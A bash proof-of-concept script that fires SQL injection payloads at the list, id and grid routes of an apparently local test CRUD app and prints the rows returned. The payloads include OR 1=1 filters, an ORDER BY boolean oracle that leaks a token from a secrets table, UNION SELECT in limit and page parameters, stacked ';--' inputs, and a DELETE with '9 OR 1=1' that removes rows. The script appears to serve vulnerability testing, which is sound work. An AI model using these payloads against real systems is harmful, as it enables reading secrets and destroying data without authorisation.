#!/usr/bin/env bash
# Usage: prove.sh BASE_URL   (an app from py/ php/ rb/ nd/ already serving)
# Fires request-controlled SQL-shaped values at the AutoCrud list/id routes and the
# Crud.to_crud grid page, and prints status + the row names that came back.
B=${1:?base url}
summ() { python3 -I -c '
import sys, json, re
code, body = sys.argv[1], sys.stdin.read()
try:
    j = json.loads(body)
    if isinstance(j, dict) and "records" in j:
        print(code, "rows=" + ",".join(str(r.get("name")) for r in j["records"]), "total=%s" % j.get("total"))
    elif isinstance(j, dict) and "name" in j:
        print(code, "row=" + str(j["name"]))
    else:
        print(code, json.dumps(j)[:160])
except Exception:
    tds = re.findall(r"<td[^>]*>([^<]*)</td>", body)
    names = [t.replace("&#39;", "\x27").replace("&#039;", "\x27").replace("&#x27;", "\x27") for t in tds if re.search(r"Ann|Brien|Zed|TOPSECRET", t)]
    err = re.findall(r"(?i)(sqlite[^<]{0,120}|syntax error[^<]{0,80}|exception[^<]{0,80})", body)[:1]
    print(code, "grid=" + ",".join(names), ("ERR:" + err[0]) if err else "")
' "$1"; }
req() { # method label path
  local out code
  out=$(curl -s -g -X "$1" -w '\n%{http_code}' "$B$3"); code=${out##*$'\n'}
  printf '%-44s ' "$2"; printf '%s' "${out%$'\n'*}" | summ "$code"
}
U() { python3 -I -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=""))' "$1"; }
echo "ORACLE = (CASE WHEN (SELECT token FROM secrets)='TOPSECRET' THEN -age ELSE id END)"
echo "== AutoCrud list"
req GET "control sort=name dir=desc"            "/api/people?sort=name&sort_dir=desc"
req GET "control search=O'Brien"                "/api/people?search=$(U "O'Brien")"
req GET "search=%' OR 1=1 --"                   "/api/people?search=$(U "%' OR 1=1 --")"
req GET "control sort=age"                       "/api/people?sort=age"
req GET "sort=ORACLE (raw => O'Brien,Ann,Zed)"   "/api/people?sort=$(U "(CASE WHEN (SELECT token FROM secrets)='TOPSECRET' THEN -age ELSE id END)")"
req GET "sort=name; --"                         "/api/people?sort=$(U "name; --")"
req GET "sort=(select token from secrets)"      "/api/people?sort=$(U "(select token from secrets)")"
req GET "sort=name dir=desc, (select 1)"        "/api/people?sort=name&sort_dir=$(U "desc, (select 1)")"
req GET "sort=-name (inline desc control)"      "/api/people?sort=-name"
req GET "limit=1 union select 1,token,1 ..."    "/api/people?limit=$(U "1 union select 1,token,1 from secrets")"
req GET "offset=1; --"                          "/api/people?offset=$(U "1; --")"
req GET "page=2 per_page=1 control"             "/api/people?page=2&per_page=1&limit=1"
req GET "control filter[name]=O'Brien"          "/api/people?filter[name]=$(U "O'Brien")"
req GET "filter[name]=x' OR '1'='1"             "/api/people?filter[name]=$(U "x' OR '1'='1")"
req GET "filter[name = name OR 1]=1"            "/api/people?$(U "filter[name = name OR 1]")=1"
echo "== AutoCrud by id"
req GET "control id=2"                          "/api/people/2"
req GET "id=2 OR 1=1"                           "/api/people/$(U "9 OR 1=1")"
req DELETE "DELETE id=9 OR 1=1"                 "/api/people/$(U "9 OR 1=1")"
req GET "  list after delete (want 3)"          "/api/people"
echo "== Crud.to_crud grid (model)"
req GET "control sort=name dir=desc"            "/grid?sort=name&sort_dir=desc"
req GET "control search=O'Brien"                "/grid?search=$(U "O'Brien")"
req GET "search=%' OR 1=1 --"                   "/grid?search=$(U "%' OR 1=1 --")"
req GET "control sort=age"                       "/grid?sort=age"
req GET "sort=ORACLE (raw => O'Brien,Ann,Zed)"   "/grid?sort=$(U "(CASE WHEN (SELECT token FROM secrets)='TOPSECRET' THEN -age ELSE id END)")"
req GET "sort=age; --"                          "/grid?sort=$(U "age; --")"
req GET "sort=(select token from secrets)"      "/grid?sort=$(U "(select token from secrets)")"
req GET "page=1 union select ..."               "/grid?page=$(U "1 union select 1")"
echo "== Crud.to_crud grid (custom sql)"
req GET "control sort=name dir=desc"            "/gridsql?sort=name&sort_dir=desc"
req GET "control search=O'Brien"                "/gridsql?search=$(U "O'Brien")"
req GET "search=%' OR 1=1 --"                   "/gridsql?search=$(U "%' OR 1=1 --")"
req GET "control sort=age"                       "/gridsql?sort=age"
req GET "sort=ORACLE (raw => O'Brien,Ann,Zed)"   "/gridsql?sort=$(U "(CASE WHEN (SELECT token FROM secrets)='TOPSECRET' THEN -age ELSE id END)")"
req GET "sort=name desc --"                     "/gridsql?sort=$(U "name desc --")"
req GET "sort=(select token from secrets)"      "/gridsql?sort=$(U "(select token from secrets)")"
